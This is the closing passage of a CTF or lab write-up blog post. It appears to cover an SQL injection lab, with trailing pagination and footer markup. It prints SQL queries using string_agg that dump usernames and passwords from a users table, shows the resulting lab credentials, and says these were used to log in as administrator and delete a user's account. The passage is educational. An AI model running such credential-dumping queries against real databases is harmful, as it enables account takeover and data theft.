+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(<span style="color:#e6db74">&#39; Username: &#39;</span>, username) <span style="color:#66d9ef">FROM</span> users
+ Username: carlos Username: wiener
+
+<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(<span style="color:#e6db74">&#39; Password: &#39;</span>, password) <span style="color:#66d9ef">FROM</span> users
+ Password: czcj2c2n6oylpn3411w9 Password: peter
+</code></pre></div><p>We got it, we managed to dump the credentials for signing up as the administrator and delete Carlos&#39; account.</p>
+<h1 id="the-end">The End</h1>
+<p>I hope you liked the writeup and hopefully learnt something new!</p>
+<p><a href="https://twitter.com/jorge_ctf" target="_blank">Jorge</a>.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/inctf-gosqlv3/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Solving InCTF&#39;s GoSQLv3.</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/ctr-writeup-blind_hacker/">
+                  <span class="button__text">Fwhibbit CTR (CTF): Solving Blind Hacker</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
